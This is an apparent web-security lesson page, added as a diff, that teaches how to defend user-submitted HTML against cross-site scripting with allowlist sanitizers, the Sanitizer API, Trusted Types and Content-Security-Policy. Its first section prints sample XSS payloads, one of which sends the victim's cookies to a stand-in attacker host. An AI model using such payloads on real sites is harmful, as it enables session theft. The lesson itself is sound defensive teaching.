@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Sanitizing &amp; Securing User HTML — Lesson 03</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,400;0,9..144,600;1,9..144,500&family=Inter:wght@400;500;600;700&family=IBM+Plex+Mono:wght@500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #F7F6F1; --card: #FFFFFF; --ink: #1C1F26; --muted: #63636B; --line: #E4E1D7;
+    --accent: #15803D; --accent-soft: #86EFAC; --code-bg: #14171A; --code-ink: #E8E6DF;
+  }
+  @media (prefers-color-scheme: dark) {
+    :root:not([data-theme="light"]) { --bg: #15171C; --card: #1C1F23; --ink: #EDEBE4; --muted: #9A9AA3; --line: #2D303A; --code-bg: #0E1013; --accent-soft: #15271B; }
+  }
+  :root[data-theme="dark"] { --bg: #15171C; --card: #1C1F23; --ink: #EDEBE4; --muted: #9A9AA3; --line: #2D303A; --code-bg: #0E1013; --accent-soft: #15271B; }
+  * { box-sizing: border-box; }
+  body { margin: 0; background: var(--bg); color: var(--ink); font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; padding-top: env(safe-area-inset-top, 0px); padding-bottom: env(safe-area-inset-bottom, 0px); -webkit-font-smoothing: antialiased; }
+  .wrap { max-width: 860px; margin: 0 auto; padding: 56px 24px 96px; }
+  .crumb { font-family: 'IBM Plex Mono', monospace; font-size: 12px; color: var(--muted); margin: 0 0 18px; }
+  .crumb .accent { color: var(--accent); }
+  h1 { font-family: 'Fraunces', serif; font-weight: 600; font-size: 38px; line-height: 1.1; margin: 0 0 14px; letter-spacing: -0.01em; }
+  .lede { font-size: 16px; line-height: 1.65; color: var(--muted); max-width: 58ch; margin: 0 0 40px; }
+  h2 { font-family: 'Fraunces', serif; font-style: italic; font-weight: 500; font-size: 21px; margin: 44px 0 14px; color: var(--ink); }
+  h2 .num { font-family: 'IBM Plex Mono', monospace; font-style: normal; font-size: 13px; color: var(--accent); margin-right: 10px; }
+  p { font-size: 15px; line-height: 1.7; margin: 0 0 14px; }
+  p.tight { margin-bottom: 8px; }
+  strong { font-weight: 600; }
+  pre { background: var(--code-bg); color: var(--code-ink); border-radius: 8px; padding: 16px 18px; overflow-x: auto; margin: 14px 0 20px; font-family: 'IBM Plex Mono', monospace; font-size: 13px; line-height: 1.6; }
+  code { font-family: 'IBM Plex Mono', monospace; }
+  p code, li code, td code { background: var(--accent-soft); color: var(--accent); padding: 1px 6px; border-radius: 4px; font-size: 13px; }
+  .comment { color: #8A8F98; }
+  .callout { border-left: 3px solid var(--accent); background: var(--accent-soft); padding: 14px 16px; border-radius: 0 6px 6px 0; margin: 18px 0; font-size: 14px; line-height: 1.6; }
+  .callout .label { font-family: 'IBM Plex Mono', monospace; font-size: 11px; text-transform: uppercase; letter-spacing: 0.04em; color: var(--accent); display: block; margin-bottom: 6px; }
+  table { width: 100%; border-collapse: collapse; margin: 16px 0 24px; font-size: 13.5px; }
+  th { text-align: left; font-family: 'IBM Plex Mono', monospace; font-size: 11px; text-transform: uppercase; letter-spacing: 0.03em; color: var(--muted); font-weight: 500; padding: 0 12px 10px 0; border-bottom: 1px solid var(--line); }
+  td { padding: 11px 12px 11px 0; border-bottom: 1px solid var(--line); vertical-align: top; line-height: 1.5; }
+  tr:last-child td { border-bottom: none; }
+  ul, ol { padding-left: 20px; margin: 0 0 16px; }
+  li { font-size: 15px; line-height: 1.7; margin-bottom: 4px; }
+  .exercise { background: var(--card); border: 1px solid var(--line); border-radius: 10px; padding: 22px 24px; margin: 20px 0; }
+  .exercise .label { font-family: 'IBM Plex Mono', monospace; font-size: 11px; text-transform: uppercase; letter-spacing: 0.04em; color: var(--accent); display: block; margin-bottom: 10px; }
+  .exercise ol { margin-bottom: 0; }
+  .takeaways { background: var(--accent-soft); border-radius: 10px; padding: 22px 24px; margin-top: 40px; }
+  .takeaways .label { font-family: 'IBM Plex Mono', monospace; font-size: 11px; text-transform: uppercase; letter-spacing: 0.04em; color: var(--accent); display: block; margin-bottom: 10px; }
+  .takeaways ul { margin-bottom: 0; }
+  .takeaways li { color: var(--ink); }
+  footer { border-top: 1px solid var(--line); margin-top: 48px; padding-top: 20px; }
+  footer p { font-size: 13px; color: var(--muted); margin: 0; }
+  @media (max-width: 480px) { .wrap { padding: 40px 18px 72px; } h1 { font-size: 29px; } pre { font-size: 12px; padding: 14px; } }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <p class="crumb">senior → <span class="accent">stage 3.3 · markup at scale</span> → lesson 03</p>
+  <h1>Sanitizing &amp; Securing User HTML</h1>
+  <p class="lede">When users may submit HTML, escape what you can, sanitize with an allowlist when you can't, and add defense in depth with a Content-Security-Policy.</p>
+
+  <h2><span class="num">§1</span>Know the Threat: XSS</h2>
+
+  <p><strong>Cross-site scripting</strong> happens when attacker-controlled markup runs as code in a victim's browser, which can steal sessions, act as the user, or rewrite the page. Scripts are the obvious vector, but event handlers and URLs run code too.</p>
+  <pre>&lt;img src=x onerror="fetch('//evil.example/?c='+document.cookie)"&gt;
+&lt;a href="javascript:alert(1)"&gt;click&lt;/a&gt;
+&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</pre>
+  <p>The core rule is to keep <strong>data</strong> and <strong>code</strong> apart: output encoding for text, and sanitization for the cases where you want to keep some markup.</p>
+
+  <h2><span class="num">§2</span>Allowlist Sanitization</h2>
+
+  <p>Define exactly which elements and attributes are permitted and drop everything else. Denylists fail because attackers find the tag you forgot.</p>
+  <pre>import DOMPurify from "dompurify";
+
+const clean = DOMPurify.sanitize(userHtml, {
+  ALLOWED_TAGS: ["p", "b", "i", "em", "strong", "a", "ul", "ol", "li", "code"],
+  ALLOWED_ATTR: ["href"],
+});
+el.innerHTML = clean;</pre>
+  <p>Use a mature, maintained library and sanitize <strong>on output</strong> in the final context. Don't write your own with regular expressions, since the HTML parser handles cases regexes can't. Also force link safety by adding <code>rel</code> attributes and restricting URL schemes to <code>http</code>, <code>https</code>, and <code>mailto</code>.</p>
+
+  <h2><span class="num">§3</span>The Sanitizer API and Trusted Types</h2>
+
+  <p>Browsers are adding built-in tools. The <strong>HTML Sanitizer API</strong> (<code>element.setHTML(input)</code>) parses and sanitizes in one step, and <strong>Trusted Types</strong> make dangerous sinks like <code>innerHTML</code> accept only specially approved values. Support varies, so check current browser status before depending on them, and fall back to a library where needed.</p>
+  <pre><span class="comment">// where supported</span>
+el.setHTML(userHtml);   <span class="comment">// sanitizes by default; scripts and handlers are dropped</span>
+
+<span class="comment">// enforced via a response header:</span>
+<span class="comment">// Content-Security-Policy: require-trusted-types-for 'script'</span></pre>
+
+  <h2><span class="num">§4</span>Defense in Depth</h2>
+
+  <p>Add a <strong>Content-Security-Policy</strong> so that even if something slips through, injected inline scripts don't run.</p>
+  <pre>Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-r4nd0m';
+  object-src 'none';
+  base-uri 'none';
+  frame-ancestors 'self'</pre>
+  <p>Pair it with <code>HttpOnly</code> and <code>SameSite</code> cookies so that script access to session data is limited anyway.</p>
+
+  <div class="callout">
+    <span class="label">Escape first, sanitize second</span>
+    If users don't need to submit formatting, store and render plain text with output encoding. Allow HTML only when a real feature requires it.
+  </div>
+
+  <h2><span class="num">§5</span>Common Mistakes</h2>
+
+  <table>
+    <tr><th>Mistake</th><th>What Happens</th><th>Fix</th></tr>
+    <tr><td>Blocklisting <code>&lt;script&gt;</code> only</td><td>Event handlers and <code>javascript:</code> URLs bypass it</td><td>Use an allowlist for elements, attributes, and URL schemes</td></tr>
+    <tr><td>Sanitizing on input but rendering in a different context later</td><td>Encoding mismatch re-introduces risk</td><td>Sanitize or encode at output for the destination context</td></tr>
+    <tr><td>Writing a custom sanitizer</td><td>Parser differentials and bypasses</td><td>Use a reviewed library or the platform sanitizer</td></tr>
+  </table>
+
+  <div class="exercise">
+    <span class="label">Practice</span>
+    <ol>
+      <li>Use an allowlist sanitizer on a comment box and test it against a list of known XSS payloads.</li>
+      <li>Add a CSP header to a small app and watch the browser block an injected inline script.</li>
+    </ol>
+  </div>
+
+  <div class="takeaways">
+    <span class="label">Key takeaways</span>
+    <ul>
+      <li>Treat user HTML as hostile: encode text, and sanitize with an allowlist when markup is required.</li>
+      <li>Prefer maintained libraries and platform APIs to custom code.</li>
+      <li>Use CSP and Trusted Types as defense in depth.</li>
+    </ul>
+  </div>
+
+  <footer>
+    <p>Stage 3.3 · Markup at Scale — Lesson 3 of 5</p>
+  </footer>
+</div>
+</body>
+</html>
